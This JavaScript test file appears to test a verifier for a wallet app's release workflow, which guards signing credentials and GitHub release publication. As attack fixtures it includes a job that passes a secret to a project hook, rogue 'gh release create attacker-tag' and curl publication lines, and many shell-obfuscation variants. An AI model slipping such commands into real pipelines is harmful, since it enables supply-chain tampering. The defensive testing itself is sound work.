import assert from "node:assert/strict";
import { lstat, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { parseDocument } from "yaml";

import {
  androidBuildJobDigest,
  androidFinalizerJobDigest,
  credentialJobDigests,
  githubReleasePublisherDigest,
  githubReleasePublisherExecutableDigest,
  releaseIndexJobDigest,
  releaseIndexResultsAreComplete,
  releaseAuthorityDigests,
  verifyAppleCredentialBoundary,
  verifyGithubReleasePublisher,
} from "./apple-credential-boundary.mjs";

const profileValidityMarkers = `
          verify_developer_id_profile()
          plutil -extract TeamIdentifier raw -expect array
          plutil -extract TeamIdentifier.0 raw -expect string
          plutil -extract ProvisionsAllDevices raw -expect bool
          plutil -extract 'Entitlements.com\\.apple\\.application-identifier' raw -expect string
          plutil -extract Entitlements.keychain-access-groups raw -expect array
          plutil -extract "Entitlements.keychain-access-groups.\${group_index}" raw -expect string
          [[ "$group" == F9AV5HKF6N.cash.free2z.zuuli || "$group" == 'F9AV5HKF6N.*' ]] || return 1
          plutil -extract CreationDate raw -expect date
          plutil -extract ExpirationDate raw -expect date
          date -j -u -f "%Y-%m-%dT%H:%M:%SZ"
          created_epoch <= profile_now && profile_now < expiration_epoch`;

const captureAuthorityMarkers = `
          echo '"com.apple.security.device.audio-input"'
          echo '"com.apple.security.device.camera"'
          echo NSCameraUsageDescription
          echo NSMicrophoneUsageDescription
          echo 'ZUULI uses the camera when you broadcast or join a live video stream.'
          echo 'ZUULI uses the microphone when you broadcast or join a live stream.'`;

function removeLast(source, needle) {
  const index = source.lastIndexOf(needle);
  assert.notEqual(index, -1, `fixture is missing ${needle}`);
  return source.slice(0, index) + source.slice(index + needle.length);
}

const buildJob = (name, command) => {
  const checksumMembers = name === "ios-build"
    ? "ZUULI.xcarchive.zip ExportOptions.plist source-record.json"
    : "Entitlements.plist Info.macos.plist ZUULI.app.zip ZUULI-layout.dmg source-record.json";
  const macosPolicy = name === "macos-build"
    ? "      - run: node scripts/macos-keychain-entitlements.mjs\n"
    : "";
  return `  ${name}:
    steps:
      - uses: actions/checkout@sha
      - run: scripts/assert-no-apple-credentials.sh
      - run: npm ci
${macosPolicy}      - run: |
          ${command} --no-sign
          shasum -a 256 ${checksumMembers} > CHECKSUMS.sha256
      - run: scripts/assert-no-apple-credentials.sh
      - uses: actions/attest-build-provenance@sha
      - uses: actions/upload-artifact@sha
`;
};

const credentialJob = (name, command, secret) => {
  const selectedSecret = secret ?? (name === "ios-sign"
    ? "APPLE_DISTRIBUTION_CERTIFICATE_BASE64"
    : "APPLE_DEVELOPER_ID_CERTIFICATE_BASE64");
  const trustMarker = name === "ios-upload"
    ? "          gh attestation verify verified-ios/asc-testflight.mjs --repo repo"
    : name === "ios-sign"
      ? "          EXPECTED_PAYLOAD_SHA256=fixture\n          test \"$(shasum -a 256 unsigned-ios/CHECKSUMS.sha256 | awk '{print $1}')\" = \"$EXPECTED_PAYLOAD_SHA256\"\n          (cd unsigned-ios && shasum -a 256 -c CHECKSUMS.sha256)\n          gh attestation verify unsigned-ios/CHECKSUMS.sha256 --repo repo"
      : name === "macos-sign"
        ? `          EXPECTED_PAYLOAD_SHA256=fixture
          test "$(shasum -a 256 unsigned-macos/CHECKSUMS.sha256 | awk '{print $1}')" = "$EXPECTED_PAYLOAD_SHA256"
          (cd unsigned-macos && shasum -a 256 -c CHECKSUMS.sha256)
          gh attestation verify unsigned-macos/CHECKSUMS.sha256 --repo repo${profileValidityMarkers}
          verify_developer_id_profile "$secret_dir/profile.plist" "$profile_now"${captureAuthorityMarkers}`
        : "          echo verified";
  const cleanupMarkers = name === "ios-sign" || name === "macos-sign"
    ? name === "ios-sign"
      ? "          echo original-keychains.txt cleanup-failed\n          if [[ -n \"$profile_path\" ]] && ! rm -f -- \"$profile_path\"; then echo cleanup; fi\n          if [[ -e \"$HOME/Library/MobileDevice/Provisioning Profiles/e5ead62c-83ec-4e54-abb6-4770833b5e0d.mobileprovision\" ]]; then echo survived; fi"
      : "          echo original-keychains.txt cleanup-failed\n          if [[ \"$mounted\" == true ]] && ! hdiutil detach \"$mountpoint\" -force; then echo cleanup; fi\n          if hdiutil info | grep -Fq 'zuuli-macos-dmg-sign.'; then echo mounted; fi"
    : "          echo cleanup";
  return `  ${name}:
    environment: zuuli-app-stores
    steps:
      - uses: actions/download-artifact@sha
      - name: Verify source-bound artifact
        run: |
          shasum -a 256 -c artifact.sha256
${trustMarker}
      - name: Materialize
        env:
          VALUE: \${{ secrets.${selectedSecret} }}
        run: echo materialized
      - name: Operate
        run: ${command}
      - name: Destroy ephemeral credential
        if: always()
        run: |
          echo destroyed
${cleanupMarkers}
      - uses: actions/upload-artifact@sha
`;
};

const finalizeJob = (name) => `  ${name}:
    steps:
      - uses: actions/download-artifact@sha
${name === "macos-finalize" ? `      - run: |${profileValidityMarkers}
          verify_developer_id_profile "$inspect/profile.plist" "$profile_now"
${captureAuthorityMarkers}
` : ""}      - uses: actions/attest-build-provenance@sha
      - uses: actions/upload-artifact@sha
`;

const validWorkflow = `name: ZUULI / protected release
on:
  push:
    branches: [main]
    paths: [wallet/zuuli/release.json]
  workflow_dispatch: {}
permissions:
  contents: read
concurrency:
  group: zuuli-mobile-store
  cancel-in-progress: false
env:
  CI: true
  ZUULI_NODE_VERSION: "24.18.0"
  ZUULI_RUST_VERSION: "1.97.1"
  ZUULI_JAVA_VERSION: "21.0.12"
  ZUULI_XCODE_VERSION: "26.6"
  ZUULI_ANDROID_NDK_VERSION: "27.0.12077973"
jobs:
  prepare:
    steps: []
  android-build:
    steps:
      - uses: actions/checkout@sha
      - run: scripts/assert-no-android-credentials.sh
      - run: npm ci
      - run: |
          scripts/assert-no-android-credentials.sh
          echo aarch64-linux-android,armv7-linux-androideabi,i686-linux-android,x86_64-linux-android
          tauri android build --ci --aab -- --locked
          jarsigner -verify app.aab
          android-release-artifact.sh record app.aab
          android-release-artifact.sh seal-verifier output bundletool.jar a099cfa1543f55593bc2ed16a70a7c67fe54b1747bb7301f37fdfd6d91028e29
      - run: scripts/assert-no-android-credentials.sh
      - uses: actions/attest-build-provenance@sha
      - uses: actions/upload-artifact@sha
        with:
          name: unsigned-zuuli-android-fixture
  android-sign-upload:
    environment: zuuli-app-stores
    steps:
      - uses: actions/setup-java@b6effb05e454b25005698d916606bdc6ffcbf961
        with:
          java-version: "21.0.12"
      - name: Verify pinned Android signing JVM
        run: java -version 2>&1 | grep -F '21.0.12'
      - uses: actions/download-artifact@sha
      - name: Verify source-bound artifact checksum and attestation
        env:
          GH_TOKEN: \${{ github.token }}
        run: |
          EXPECTED_PAYLOAD_SHA256=fixture
          gh attestation verify unsigned-android/CHECKSUMS.sha256 --source-digest "$EXPECTED_SOURCE_SHA" --source-ref refs/heads/main
          gh api "repos/$EXPECTED_REPOSITORY/git/commits/$EXPECTED_SOURCE_SHA" --jq .tree.sha
      - name: Inspect attested Android artifact without credentials
        run: |
          echo bundletool-all-1.18.3.jar a099cfa1543f55593bc2ed16a70a7c67fe54b1747bb7301f37fdfd6d91028e29
          java -jar "$bundletool" dump manifest --bundle="$aab"
          echo arm64-v8a,armeabi-v7a,x86,x86_64
          rm -f -- "$bundletool"
      - name: Materialize and sign
        env:
          KEYSTORE_BASE64: \${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          KEYSTORE_PASSWORD: \${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          KEY_ALIAS: \${{ secrets.ANDROID_KEY_ALIAS }}
          KEY_PASSWORD: \${{ secrets.ANDROID_KEY_PASSWORD }}
          SERVICE_ACCOUNT_BASE64: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON_BASE64 }}
        run: |
          jarsigner -keystore upload.jks app.aab alias
          keytool -printcert -jarfile app.aab
          echo signed-aab-payload.sha256
          cmp "$RUNNER_TEMP/unsigned-aab-payload.sha256" signed
          curl --retry 3 --retry-all-errors androidpublisher.googleapis.com
      - name: Destroy ephemeral Android credentials
        if: always()
        run: echo destroyed
      - uses: actions/upload-artifact@sha
      - name: Destroy signed Android output
        if: always()
        run: echo destroyed
  android-finalize:
    steps:
      - uses: actions/download-artifact@sha
      - name: Verify signed AAB and prepare shipped artifact
        env:
          EXPECTED_IDENTITY: \${{ needs.prepare.outputs.identity }}
          EXPECTED_SOURCE_SHA: \${{ needs.prepare.outputs.source_sha }}
          EXPECTED_SIGNED_SHA256: \${{ needs.android-sign-upload.outputs.artifact_sha256 }}
        run: |
          (cd signed-android && sha256sum -c CHECKSUMS.sha256)
          jq -e --arg identity "$EXPECTED_IDENTITY" --arg source "$EXPECTED_SOURCE_SHA" --arg sha "$EXPECTED_SIGNED_SHA256" '.kind == "android-signed-universal-aab" and .identity == $identity and .sourceSha == $source and .signedSha256 == $sha' signed-android/signing-record.json
          test "$(sha256sum "signed-android/ZUULI-\${EXPECTED_IDENTITY}-android.aab" | awk '{print $1}')" = "$EXPECTED_SIGNED_SHA256"
          mkdir release-artifacts
          cp "signed-android/ZUULI-\${EXPECTED_IDENTITY}-android.aab" release-artifacts/
      - uses: actions/attest-build-provenance@sha
      - uses: actions/upload-artifact@sha
${buildJob("ios-build", "tauri ios build --archive-only")}
${credentialJob("ios-sign", "xcodebuild -exportArchive")}
${finalizeJob("ios-verify")}
${credentialJob("ios-upload", "xcrun altool --upload-app", "ASC_KEY_BASE64")}
${finalizeJob("ios-finalize")}
${buildJob("macos-build", "tauri build")}
${credentialJob("macos-sign", "codesign --entitlements unsigned-macos/Entitlements.plist app && echo signed-entitlements.plist embedded.provisionprofile APPLE_DEVELOPER_ID_PROVISIONING_PROFILE_BASE64 '\"keychain-access-groups\"[0]' && xcrun notarytool submit app")}
${finalizeJob("macos-finalize")}
  linux:
    container:
      credentials:
        password: \${{ secrets.GITHUB_TOKEN }}
  release-index:
    name: Immutable GitHub release index
    needs: [prepare, android-build, android-sign-upload, android-finalize, ios-finalize, linux, macos-finalize]
    if: >-
      always() && !cancelled() &&
      needs.prepare.result == 'success' &&
      needs.prepare.outputs.should_release == 'true' &&
      (((needs.prepare.outputs.target == 'mobile' ||
      needs.prepare.outputs.target == 'android' ||
      needs.prepare.outputs.target == 'all') &&
      needs.android-build.result == 'success' &&
      needs.android-sign-upload.result == 'success' &&
      needs.android-finalize.result == 'success') ||
      ((needs.prepare.outputs.target != 'mobile' &&
      needs.prepare.outputs.target != 'android' &&
      needs.prepare.outputs.target != 'all') &&
      needs.android-build.result == 'skipped' &&
      needs.android-sign-upload.result == 'skipped' &&
      needs.android-finalize.result == 'skipped')) &&
      ((((needs.prepare.outputs.target == 'mobile' ||
      needs.prepare.outputs.target == 'ios' ||
      needs.prepare.outputs.target == 'all') &&
      needs.ios-finalize.result == 'success') ||
      ((needs.prepare.outputs.target == 'android' ||
      needs.prepare.outputs.target == 'desktop') &&
      needs.ios-finalize.result == 'skipped'))) &&
      ((((needs.prepare.outputs.target == 'desktop' ||
      needs.prepare.outputs.target == 'all') &&
      needs.linux.result == 'success' &&
      needs.macos-finalize.result == 'success') ||
      ((needs.prepare.outputs.target == 'mobile' ||
      needs.prepare.outputs.target == 'ios' ||
      needs.prepare.outputs.target == 'android') &&
      needs.linux.result == 'skipped' &&
      needs.macos-finalize.result == 'skipped')))
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: \${{ needs.prepare.outputs.source_sha }}
          fetch-depth: 0
          fetch-tags: true
          persist-credentials: false
      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131
        with:
          pattern: zuuli-{android,ios,linux,macos}-\${{ needs.prepare.outputs.identity }}-\${{ needs.prepare.outputs.source_sha }}
          path: release-downloads
          merge-multiple: false
      - name: Verify release-index source binding
        env:
          RELEASE_IDENTITY: \${{ needs.prepare.outputs.identity }}
          EXPECTED_SOURCE_SHA: \${{ needs.prepare.outputs.source_sha }}
          RELEASE_TARGET: \${{ needs.prepare.outputs.target }}
        run: wallet/zuuli/scripts/verify-release-index.sh release-downloads "$RELEASE_IDENTITY" "$EXPECTED_SOURCE_SHA" "$RELEASE_TARGET"
      - name: Publish idempotent draft release
        if: needs.prepare.outputs.dry_run == 'false' && needs.prepare.outputs.tag_exists == 'true'
        env:
          GH_TOKEN: \${{ github.token }}
          RELEASE_TAG: \${{ needs.prepare.outputs.tag }}
          RELEASE_IDENTITY: \${{ needs.prepare.outputs.identity }}
          RELEASE_SOURCE_SHA: \${{ needs.prepare.outputs.source_sha }}
        run: wallet/zuuli/scripts/publish-github-release.sh "$RELEASE_TAG" "$RELEASE_IDENTITY" "$RELEASE_SOURCE_SHA" release-downloads
      - uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f
        with:
          name: zuuli-release-index-\${{ needs.prepare.outputs.identity }}-\${{ needs.prepare.outputs.source_sha }}
          path: release-downloads
          if-no-files-found: error
          retention-days: 90
`;

const credentialEscapeWorkflow = `name: Credential escape fixture
on:
  workflow_call:
jobs:
  escape:
    runs-on: macos-15
    environment: zuuli-app-stores
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - name: Run project hook with inherited Apple authority
        env:
          ASC_KEY_BASE64: \${{ secrets.ASC_KEY_BASE64 }}
        run: wallet/zuuli/scripts/project-hook.sh
`;

const fixtureCredentialJobDigests = credentialJobDigests(validWorkflow);
const fixtureRootAuthorityDigests = releaseAuthorityDigests(validWorkflow);
const fixtureAndroidBuildJobDigest = androidBuildJobDigest(validWorkflow);
const fixtureAndroidFinalizerJobDigest = androidFinalizerJobDigest(validWorkflow);
const fixtureReleaseIndexJobDigest = releaseIndexJobDigest(validWorkflow);
const verifyFixture = (source) => verifyAppleCredentialBoundary(source, {
  credentialJobDigests: fixtureCredentialJobDigests,
  rootAuthorityDigests: fixtureRootAuthorityDigests,
  expectedAndroidBuildDigest: fixtureAndroidBuildJobDigest,
  expectedAndroidFinalizerDigest: fixtureAndroidFinalizerJobDigest,
  expectedReleaseIndexDigest: fixtureReleaseIndexJobDigest,
});
const verifyFixtureWithReanchoredReleaseIndex = (source) => verifyAppleCredentialBoundary(source, {
  credentialJobDigests: fixtureCredentialJobDigests,
  rootAuthorityDigests: fixtureRootAuthorityDigests,
  expectedAndroidBuildDigest: fixtureAndroidBuildJobDigest,
  expectedAndroidFinalizerDigest: fixtureAndroidFinalizerJobDigest,
  expectedReleaseIndexDigest: releaseIndexJobDigest(source),
});

test("accepts separated source, credential, and finalization jobs", () => {
  assert.deepEqual(verifyFixture(validWorkflow), []);
});

test("release-index result policy is exhaustive for every target", () => {
  const selectedByTarget = new Map([
    ["mobile", ["android-build", "android-sign-upload", "android-finalize", "ios-finalize"]],
    ["ios", ["ios-finalize"]],
    ["android", ["android-build", "android-sign-upload", "android-finalize"]],
    ["desktop", ["linux", "macos-finalize"]],
    ["all", ["android-build", "android-sign-upload", "android-finalize", "ios-finalize", "linux", "macos-finalize"]],
  ]);
  const jobs = ["android-build", "android-sign-upload", "android-finalize", "ios-finalize", "linux", "macos-finalize"];
  for (const [target, selected] of selectedByTarget) {
    const selectedSet = new Set(selected);
    const valid = Object.fromEntries(
      jobs.map((job) => [job, selectedSet.has(job) ? "success" : "skipped"]),
    );
    assert.equal(releaseIndexResultsAreComplete(target, valid), true, target);
    for (const job of jobs) {
      const mutation = { ...valid };
      mutation[job] = selectedSet.has(job) ? "skipped" : "success";
      assert.equal(
        releaseIndexResultsAreComplete(target, mutation),
        false,
        `${target} accepted wrong result for ${job}`,
      );
      if (selectedSet.has(job)) {
        mutation[job] = "failure";
        assert.equal(
          releaseIndexResultsAreComplete(target, mutation),
          false,
          `${target} accepted failed selected job ${job}`,
        );
      }
    }
  }
  assert.equal(releaseIndexResultsAreComplete("unknown", {}), false);
});

test("rejects a selected iOS failure represented by a skipped finalizer", () => {
  const mutated = validWorkflow.replace(
    "needs.ios-finalize.result == 'success'",
    "(needs.ios-finalize.result == 'success' || needs.ios-finalize.result == 'skipped')",
  );
  const failures = verifyFixture(mutated);
  assert.ok(
    failures.some((failure) => failure.includes("exact selected-success/unselected-skipped target matrix")),
    failures.join("\n"),
  );
});

for (const [target, needle] of [
  ["mobile", "needs.prepare.outputs.target == 'mobile'"],
  ["ios", "needs.prepare.outputs.target == 'ios'"],
  ["android", "needs.prepare.outputs.target == 'android'"],
  ["desktop", "needs.prepare.outputs.target == 'desktop'"],
  ["all", "needs.prepare.outputs.target == 'all'"],
]) {
  test(`rejects release-index condition drift in ${target} mode`, () => {
    const mutated = validWorkflow.replace(needle, `${needle} || true`);
    assert.notEqual(mutated, validWorkflow, `missing ${target} fixture clause`);
    const failures = verifyFixture(mutated);
    assert.ok(
      failures.some((failure) => failure.includes("exact selected-success/unselected-skipped target matrix")),
      failures.join("\n"),
    );
  });
}

test("rejects deletion of the release-index target binding", () => {
  const mutated = validWorkflow.replace(
    "          RELEASE_TARGET: \${{ needs.prepare.outputs.target }}\n",
    "",
  );
  const failures = verifyFixture(mutated);
  assert.ok(
    failures.some((failure) => failure.includes("exactly the reviewed checkout")),
    failures.join("\n"),
  );
});

test("rejects a soft-failing release-index verifier step", () => {
  const mutated = validWorkflow.replace(
    "      - name: Verify release-index source binding\n",
    "      - name: Verify release-index source binding\n        continue-on-error: true\n",
  );
  const failures = verifyFixture(mutated);
  assert.ok(
    failures.some((failure) => failure.includes("exactly the reviewed checkout")),
    failures.join("\n"),
  );
});

test("rejects a decorative release-index command with a no-op verifier", () => {
  const command = 'wallet/zuuli/scripts/verify-release-index.sh release-downloads "$RELEASE_IDENTITY" "$EXPECTED_SOURCE_SHA" "$RELEASE_TARGET"';
  const mutated = validWorkflow
    .replace(`        run: ${command}\n`, "        run: true\n")
    .replace(
      "      - name: Verify release-index source binding\n",
      `      - name: Decorative ${command}\n        run: echo decorative\n      - name: Verify release-index source binding\n`,
    );
  const failures = verifyFixture(mutated);
  assert.ok(
    failures.some((failure) => failure.includes("exactly the reviewed checkout")),
    failures.join("\n"),
  );
});

test("rejects release-index verification after draft publication", () => {
  const verifier = `      - name: Verify release-index source binding
        env:
          RELEASE_IDENTITY: \${{ needs.prepare.outputs.identity }}
          EXPECTED_SOURCE_SHA: \${{ needs.prepare.outputs.source_sha }}
          RELEASE_TARGET: \${{ needs.prepare.outputs.target }}
        run: wallet/zuuli/scripts/verify-release-index.sh release-downloads "$RELEASE_IDENTITY" "$EXPECTED_SOURCE_SHA" "$RELEASE_TARGET"
`;
  const mutated = validWorkflow
    .replace(verifier, "")
    .replace(
      "      - uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f\n",
      `${verifier}      - uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f\n`,
    );
  const failures = verifyFixture(mutated);
  assert.ok(
    failures.some((failure) => failure.includes("exactly the reviewed checkout")),
    failures.join("\n"),
  );
});

for (const [name, step] of [
  [
    "alternate draft creation",
    "      - name: Alternate publisher\n        env:\n          GH_TOKEN: \${{ github.token }}\n        run: gh release create attacker-tag --draft\n",
  ],
  [
    "alternate release upload",
    "      - name: Alternate uploader\n        env:\n          GH_TOKEN: \${{ github.token }}\n        run: gh release upload attacker-tag release-downloads/*\n",
  ],
  [
    "alternate API publication",
    "      - name: Alternate API publisher\n        run: curl --request POST https://api.github.com/repos/free2z/zuu/releases\n",
  ],
]) {
  test(`rejects reanchored release-index ${name}`, () => {
    const mutated = validWorkflow.replace(
      "      - name: Verify release-index source binding\n",
      `${step}      - name: Verify release-index source binding\n`,
    );
    assert.notEqual(mutated, validWorkflow);
    const failures = verifyFixtureWithReanchoredReleaseIndex(mutated);
    assert.ok(
      failures.some((failure) => failure.includes("exactly the reviewed checkout")),
      failures.join("\n"),
    );
    assert.ok(
      failures.every((failure) => !failure.includes("release-index execution program changed")),
      `digest was not reanchored:\n${failures.join("\n")}`,
    );
  });
}

for (const [name, needle, replacement] of [
  [
    "job continue-on-error",
    "    runs-on: ubuntu-24.04\n",
    "    continue-on-error: true\n    runs-on: ubuntu-24.04\n",
  ],
  [
    "job GH_REPO environment override",
    "    runs-on: ubuntu-24.04\n",
    "    env:\n      GH_REPO: attacker/example\n    runs-on: ubuntu-24.04\n",
  ],
  [
    "runner drift",
    "    runs-on: ubuntu-24.04\n",
    "    runs-on: self-hosted\n",
  ],
  [
    "permission weakening",
    "      contents: write\n",
    "      contents: read\n",
  ],
]) {
  test(`rejects reanchored release-index ${name}`, () => {
    const mutated = validWorkflow.replace(needle, replacement);
    assert.notEqual(mutated, validWorkflow, `missing fixture for ${name}`);
    const failures = verifyFixtureWithReanchoredReleaseIndex(mutated);
    assert.ok(
      failures.some((failure) => failure.includes("reviewed job authority")),
      failures.join("\n"),
    );
    assert.ok(
      failures.every((failure) => !failure.includes("release-index execution program changed")),
      `digest was not reanchored:\n${failures.join("\n")}`,
    );
  });
}

test("accepts the exact GitHub release publisher program", async () => {
  const source = await readFile(new URL("./publish-github-release.sh", import.meta.url), "utf8");
  assert.deepEqual(verifyGithubReleasePublisher(source), []);
});

for (const [name, attack, semanticFailure] of [
  [
    "extra gh draft publication",
    "\ngh release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "extra gh asset upload",
    "\ngh release upload attacker-tag release-downloads/attacker.tar.gz\n",
    "exact reviewed program",
  ],
  [
    "extra curl API publication",
    "\ncurl --request POST https://api.github.com/repos/free2z/zuu/releases\n",
    "exact reviewed program",
  ],
  [
    "quote-constructed gh assignment and variable command",
    "\npublisher=g'h'\n\"$publisher\" release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "direct quote-constructed gh command",
    "\ng'h' release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "variable command word",
    "\npublisher=gh\n$publisher release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "indirect parameter command word",
    "\nselected=publisher\npublisher=gh\n\"${!selected}\" release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "command wrapper",
    "\ncommand gh release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "builtin command wrapper",
    "\nbuiltin command gh release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "env command wrapper",
    "\nenv GH_TOKEN=attacker gh release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "exec plus quote-constructed command",
    "\nexec g'h' release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "array and indirect expansion behind exec",
    "\npieces=(g h)\npublisher=$(printf '%s' \"${pieces[@]}\")\nselected=publisher\nexec \"${!selected}\" release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "timed quote-constructed alias",
    "\na'lias' publish='gh release create attacker-tag --draft'\ntime publish\n",
    "exact reviewed program",
  ],
  [
    "function wrapper",
    "\nfunction publish_attack { exec g'h' release create attacker-tag --draft; }\npublish_attack\n",
    "exact reviewed program",
  ],
  [
    "timed variable command",
    "\npublisher=gh\ntime \"$publisher\" release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "quote-built builtin and env chain",
    "\nexec b'uiltin' e'nv' GH_TOKEN=attacker g'h' release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
  [
    "generated publisher script",
    "\nprintf '%s\\n' 'gh release create attacker-tag --draft' > \"$package_dir/publish\"\nchmod +x \"$package_dir/publish\"\n\"$package_dir/publish\"\n",
    "exact reviewed program",
  ],
  [
    "generated command piped to a shell",
    "\nprintf '%s\\n' 'gh release create attacker-tag --draft' | sh\n",
    "exact reviewed program",
  ],
  [
    "shell interpreter indirection",
    "\nexec \"$SHELL\" -c 'gh release create attacker-tag --draft'\n",
    "exact reviewed program",
  ],
  [
    "publication in a subshell",
    "\n( g'h' release create attacker-tag --draft )\n",
    "exact reviewed program",
  ],
  [
    "PATH symlink indirection",
    "\nln -s \"$(command -v gh)\" \"$package_dir/publish\"\nPATH=\"$package_dir:$PATH\" publish release create attacker-tag --draft\n",
    "exact reviewed program",
  ],
]) {
  test(`rejects a fully reanchored publisher with ${name}`, async () => {
    const source = await readFile(new URL("./publish-github-release.sh", import.meta.url), "utf8");
    const mutated = `${source}${attack}`;
    const failures = verifyGithubReleasePublisher(mutated, {
      expectedDigest: githubReleasePublisherDigest(mutated),
      expectedExecutableDigest: githubReleasePublisherExecutableDigest(mutated),
    });
    assert.ok(
      failures.some((failure) => failure.includes(semanticFailure)),
      failures.join("\n"),
    );
    assert.ok(
      failures.every((failure) =>
        !failure.includes("publisher execution program changed:") &&
        !failure.includes("publisher executable program changed:")),
      `publisher digests were not fully reanchored:\n${failures.join("\n")}`,
    );
  });
}

for (const [name, mutate] of [
  [
    "alternate interpreter",
    (source) => source.replace("#!/usr/bin/env bash", "#!/bin/zsh"),
  ],
  [
    "backslash comment suppressing upload",
    (source) => source.replace(
      '    gh release upload "$tag" "$archive"',
      '    # suppress the reviewed upload \\\n    gh release upload "$tag" "$archive"',
    ),
  ],
  [
    "comment inside a reviewed command continuation",
    (source) => source.replace(
      '  gh release create "$tag" --verify-tag --draft \\\n',
      '  gh release create "$tag" --verify-tag --draft \\\n    # suppress the reviewed argv\n',
    ),
  ],
]) {
  test(`rejects a fully reanchored publisher with ${name}`, async () => {
    const source = await readFile(new URL("./publish-github-release.sh", import.meta.url), "utf8");
    const mutated = mutate(source);
    assert.notEqual(mutated, source, `missing fixture for ${name}`);
    const failures = verifyGithubReleasePublisher(mutated, {
      expectedDigest: githubReleasePublisherDigest(mutated),
      expectedExecutableDigest: githubReleasePublisherExecutableDigest(mutated),
    });
    assert.ok(
      failures.some((failure) => failure.includes("exact reviewed program")),
      failures.join("\n"),
    );
  });
}

test("rejects a fully reanchored publisher without immediate pre-upload identity verification", async () => {
  const source = await readFile(new URL("./publish-github-release.sh", import.meta.url), "utf8");
  const mutated = source.replace(
    '    reverify_tag_identity\n    gh release upload "$tag" "$archive"',
    '    gh release upload "$tag" "$archive"',
  );
  assert.notEqual(mutated, source, "missing pre-upload verification fixture");
  const failures = verifyGithubReleasePublisher(mutated, {
    expectedDigest: githubReleasePublisherDigest(mutated),
    expectedExecutableDigest: githubReleasePublisherExecutableDigest(mutated),
  });
  assert.ok(
    failures.some((failure) => failure.includes("immediately preceded")),
    failures.join("\n"),
  );
});

test("rejects a bare Bash assertion in an Apple release job", () => {
  const mutated = validWorkflow.replace(
    "          tauri ios build --archive-only --no-sign\n",
    "          [[ 1 -eq 2 ]]\n          tauri ios build --archive-only --no-sign\n",
  );
  const failures = verifyFixture(mutated);
  assert.ok(
    failures.some((failure) => failure.includes("bare Bash [[ ]] assertion")),
    failures.join("\n"),
  );
});

const unsealedMacJobs = [
  "ios-build",
  "macos-build",
  "ios-verify",
  "ios-finalize",
  "macos-finalize",
];
const inertAssertionForms = [
  ["trailing semicolon", "[[ 1 -eq 2 ]];"],
  ["spaced trailing semicolon", "[[ 1 -eq 2 ]] ;"],
  ["trailing command", "[[ 1 -eq 2 ]]; echo REACHED"],
  ["mid-line statement", "echo prep; [[ 1 -eq 2 ]]; echo REACHED"],
  ["then-list statement", "if true; then [[ 1 -eq 2 ]]; echo REACHED; fi"],
  ["and-list trailing statement", "true && [[ 1 -eq 2 ]]; echo REACHED"],
  ["group statement", "{ [[ 1 -eq 2 ]]; echo REACHED; }"],
  ["background-list statement", "sleep 0 & [[ 1 -eq 2 ]]; echo REACHED"],
  ["timed statement", "time [[ 1 -eq 2 ]]; echo REACHED"],
  ["POSIX timed statement", "time -p [[ 1 -eq 2 ]]; echo REACHED"],
  [
    "do-list statement",
    "for item in one; do [[ 1 -eq 2 ]]; echo REACHED; done",
  ],
  [
    "line continuation",
    `[[ 1 -eq 1 && ${String.fromCharCode(92)}\n  1 -eq 2 ]]`,
  ],
  ["implicit multiline condition", "[[ 1 -eq 1 &&\n  1 -eq 2 ]]"],
];

for (const job of unsealedMacJobs) {
  for (const [form, assertion] of inertAssertionForms) {
    test(`rejects ${form} assertion in unsealed ${job}`, () => {
      const marker = `  ${job}:\n    steps:\n`;
      const script = assertion
        .split("\n")
        .map((line) => `          ${line}`)
        .join("\n");
      const mutated = validWorkflow.replace(
        marker,
        `${marker}      - run: |\n${script}\n`,
      );
      assert.notEqual(mutated, validWorkflow, `missing fixture job ${job}`);
      const failures = verifyFixture(mutated);
      assert.ok(
        failures.some(
          (failure) =>
            failure.includes(job) &&
            failure.includes("bare Bash [[ ]] assertion"),
        ),
        failures.join("\n"),
      );
    });
  }
}

const guardedAssertionForms = [
  ["if condition", "if [[ 1 -eq 2 ]]; then echo skipped; fi"],
  ["while condition", "while [[ 1 -eq 2 ]]; do echo skipped; done"],
  ["negated condition", "! [[ 1 -eq 2 ]]"],
  ["and-list condition", "[[ 1 -eq 2 ]] && echo skipped"],
  ["explicit failure guard", "[[ 1 -eq 2 ]] || exit 1"],
];

for (const [form, assertion] of guardedAssertionForms) {
  test(`accepts ${form} in an unsealed build job`, () => {
    const mutated = validWorkflow.replace(
      "          tauri ios build --archive-only --no-sign\n",
      `          ${assertion}\n          tauri ios build --archive-only --no-sign\n`,
    );
    const failures = verifyFixture(mutated);
    assert.ok(
      failures.every(
        (failure) => !failure.includes("bare Bash [[ ]] assertion"),
      ),
      failures.join("\n"),
    );
  });
}

test("an explicit assertion guard aborts before credential work continues", () => {
  const result = spawnSync(
    "/bin/bash",
    ["-c", 'set -euo pipefail; [[ 1 -eq 2 ]] || { echo "assertion rejected" >&2; exit 1; }; echo REACHED'],
    { encoding: "utf8" },
  );
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /assertion rejected/);
